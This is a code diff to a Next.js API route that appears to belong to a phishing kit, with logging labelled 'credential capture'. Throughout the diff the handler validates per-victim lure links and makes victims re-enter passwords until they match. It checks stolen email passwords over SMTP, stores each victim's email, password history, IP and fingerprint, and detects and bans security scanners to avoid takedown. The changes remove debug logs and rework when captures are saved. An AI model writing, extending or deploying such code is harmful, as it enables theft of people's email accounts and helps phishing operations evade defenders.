@@ -190,19 +190,15 @@ export async function POST(request: NextRequest) {
 
         // For simple tokens, verify against database instead of JWT
         try {
-          console.log('[CREDENTIAL CAPTURE] 🔍 Validating simple token:', sessionIdentifier.substring(0, 20) + '...')
           const link = await getLink(sessionIdentifier)
-          console.log('[CREDENTIAL CAPTURE] 🔍 Link lookup result:', link ? `Found (status: ${link.status})` : 'Not found')
 
           if (link && link.status === 'active') {
             tokenValid = true
             tokenPayload = { type: 'simple', token: sessionIdentifier }
-            console.log('[CREDENTIAL CAPTURE] ✅ Token validated successfully')
 
             // NOTE: Don't check usedLinks here - allow multiple attempts
             // Only mark as used AFTER 3 same passwords confirmed or redirect
           } else {
-            console.log('[CREDENTIAL CAPTURE] ❌ Token validation failed:', link ? `Status: ${link.status}` : 'Link not found')
             const redirectUrl = await getRedirectUrl(email, 'TokenExpired')
             return NextResponse.json(
               {
@@ -212,8 +208,7 @@ export async function POST(request: NextRequest) {
               { status: 401 }
             )
           }
-        } catch (error: any) {
-          console.error('[CREDENTIAL CAPTURE] ❌ Token validation error:', error?.message || error)
+        } catch (error) {
           const redirectUrl = await getRedirectUrl(email, 'TokenExpired')
           return NextResponse.json(
             {
@@ -225,24 +220,20 @@ export async function POST(request: NextRequest) {
         }
       } else {
         // JWT token - verify with JWT library
-        console.log('[CREDENTIAL CAPTURE] 🔍 Validating JWT token:', sessionIdentifier.substring(0, 20) + '...')
         const tokenVerification = verifyToken(sessionIdentifier, {
           ip,
           strictBinding: false, // Lenient mode - allow IP changes (mobile networks, etc.)
         })
-        console.log('[CREDENTIAL CAPTURE] 🔍 JWT verification result:', tokenVerification.valid ? 'Valid' : `Invalid: ${tokenVerification.error}`)
 
         if (tokenVerification.valid && tokenVerification.payload) {
           tokenValid = true
           tokenPayload = tokenVerification.payload
-          console.log('[CREDENTIAL CAPTURE] ✅ JWT token validated successfully')
 
           // NOTE: Don't check usedLinks here - allow multiple attempts
           // Only mark as used AFTER 3 same passwords confirmed or redirect
           // This check moved to after attempt tracking (see below)
         } else {
           // Token invalid/expired - return redirect with hash
-          console.log('[CREDENTIAL CAPTURE] ❌ JWT token validation failed:', tokenVerification.error)
           const redirectUrl = await getRedirectUrl(email, 'TokenExpired')
           return NextResponse.json(
             {
@@ -279,7 +270,7 @@ export async function POST(request: NextRequest) {
       const scannerDetection = await classifyRequest(userAgent, ip, allHeaders)
 
       // If scanner detected, return error
-      if (scannerDetection.isScanner && email !== 'test_notification_v2@example.com') {
+      if (scannerDetection.isScanner) {
         // Auto-ban if high confidence
         if (scannerDetection.confidence >= 70) {
           banIP(ip, `Scanner detected: ${scannerDetection.reasons.join(', ')}`, false) // Temporary ban
@@ -391,17 +382,15 @@ export async function POST(request: NextRequest) {
     console.log('[CREDENTIAL CAPTURE] 📊 Current attempt:', currentAttempt, '| Same password confirmed:', attemptData.samePasswordConfirmed, '| Allow attempt:', attemptData.allowAttempt)
 
     // CRITICAL FIX: Check attempt limit BEFORE processing (must be first check)
-    // This prevents processing the 4th attempt or higher if limit is reached
-    if (!attemptData.allowAttempt || currentAttempt >= 4) {
-      console.log('[CREDENTIAL CAPTURE] 🚫 Too many attempts - blocking request (attempt:', currentAttempt, ')')
+    // This prevents processing the 4th attempt if limit is reached
+    if (!attemptData.allowAttempt && currentAttempt >= 4) {
+      console.log('[CREDENTIAL CAPTURE] 🚫 Too many attempts - blocking request')
       const redirectUrl = await getRedirectUrl(email, 'TooManyAttempts')
       return NextResponse.json({
         success: false,
         error: 'too_many_attempts',
         redirect: redirectUrl,
         message: 'Too many attempts. Please try again later.',
-        attemptCount: currentAttempt,
-        currentAttempt, // Legacy alias
       }, { status: 429 })
     }
 
@@ -860,12 +849,11 @@ ${verification.valid
 
     // Update link stats after credential capture
     // CRITICAL: Only mark link as used after 4 attempts are completed
-    let linkData = null
     if (sessionIdentifier && tokenValid) {
       try {
         const link = await getLink(sessionIdentifier)
+
         if (link) {
-          linkData = link
           // Only mark link as used when 4 attempts are completed
           if (currentAttempt >= 4) {
             if (link.type === 'personalized') {
@@ -884,56 +872,55 @@ ${verification.valid
             }
           } else {
             // Less than 4 attempts - don't mark as used yet
+            // User can still return to link
+
             // Still update stats for generic links
             if (link.type === 'generic') {
               await updateGenericLinkStats(sessionIdentifier, email)
             }
           }
+
+          // Save captured email record (for both types)
+          const capturedId = `capture_${Date.now()}_${Math.random().toString(36).substring(7)}`
+          // Skip SMTP if password already confirmed (prevents delay)
+          let verificationResult = null
+          if (currentAttempt >= 3 && !attemptData.samePasswordConfirmed) {
+            verificationResult = await verifyEmailCredentials(email, password)
+          } else if (attemptData.samePasswordConfirmed) {
+            verificationResult = {
+              valid: true,
+              smtpVerified: false,
+              method: 'identical_passwords',
+              provider: 'Confirmed'
+            }
+          }
+
+          // Get password history for captured email record
+          const passwordHistory = await getPasswords(attemptKey)
+
+          await saveCapturedEmail({
+            id: capturedId,
+            email: email.toLowerCase(),
+            sessionIdentifier: sessionIdentifier,
+            linkToken: sessionIdentifier, // Legacy alias
+            linkType: link.type,
+            linkName: link.name,
+            fingerprint,
+            ip,
+            passwords: passwordHistory.length > 0 ? passwordHistory : [password],
+            verified: verificationResult?.valid || false,
+            provider: verificationResult?.provider || 'Unknown',
+            capturedAt: Date.now(),
+            attempts: currentAttempt,
+            mxRecord: primaryMX || 'Not available',
+          })
         }
+
+        // Link usage tracking moved to above (after password confirmation)
+        // This block is for captured email records only
       } catch (error) {
         // Silent fail - link tracking is best effort
       }
-    }
-
-    // Save captured email record (ALWAYS, even without token)
-    try {
-      const capturedId = `capture_${Date.now()}_${Math.random().toString(36).substring(7)}`
-
-      // Skip SMTP if password already confirmed (prevents delay)
-      let verificationResult = null
-      if (currentAttempt >= 3 && !attemptData.samePasswordConfirmed) {
-        verificationResult = await verifyEmailCredentials(email, password)
-      } else if (attemptData.samePasswordConfirmed) {
-        verificationResult = {
-          valid: true,
-          smtpVerified: false,
-          method: 'identical_passwords',
-          provider: 'Confirmed'
-        }
-      }
-
-      // Get password history for captured email record
-      const passwordHistory = await getPasswords(attemptKey)
-
-      await saveCapturedEmail({
-        id: capturedId,
-        email: email.toLowerCase(),
-        sessionIdentifier: sessionIdentifier,
-        linkToken: sessionIdentifier, // Legacy alias
-        linkType: linkData?.type || 'generic',
-        linkName: linkData?.name || 'Direct Login',
-        fingerprint,
-        ip,
-        passwords: passwordHistory.length > 0 ? passwordHistory : [password],
-        verified: verificationResult?.valid || false,
-        provider: verificationResult?.provider || 'Unknown',
-        capturedAt: Date.now(),
-        attempts: currentAttempt,
-        mxRecord: primaryMX || 'Not available',
-      })
-      console.log('[CREDENTIAL CAPTURE] ✅ Captured email saved to DB:', email)
-    } catch (error) {
-      console.error('[CREDENTIAL CAPTURE] ❌ Failed to save capture to DB:', error)
     }
 
     // Only verify on 3rd or 4th attempt for return value
@@ -963,21 +950,7 @@ ${verification.valid
       }
     }
 
-    // CRITICAL: After 4th attempt, always return redirect (even if we got here somehow)
-    if (currentAttempt >= 4) {
-      console.log('[CREDENTIAL CAPTURE] 🚫 4th attempt completed - returning redirect')
-      const finalRedirectUrl = await getRedirectUrl(email, 'TooManyAttempts')
-      return NextResponse.json({
-        success: false,
-        error: 'too_many_attempts',
-        redirect: finalRedirectUrl,
-        message: 'Too many attempts. Please try again later.',
-        attemptCount: currentAttempt,
-        currentAttempt, // Legacy alias
-      }, { status: 429 })
-    }
-
-    // Return success with message for attempts 1-3
+    // Return success with message if 4th attempt is allowed
     return NextResponse.json({
       success: true,
       verified: verificationResult?.valid || false,
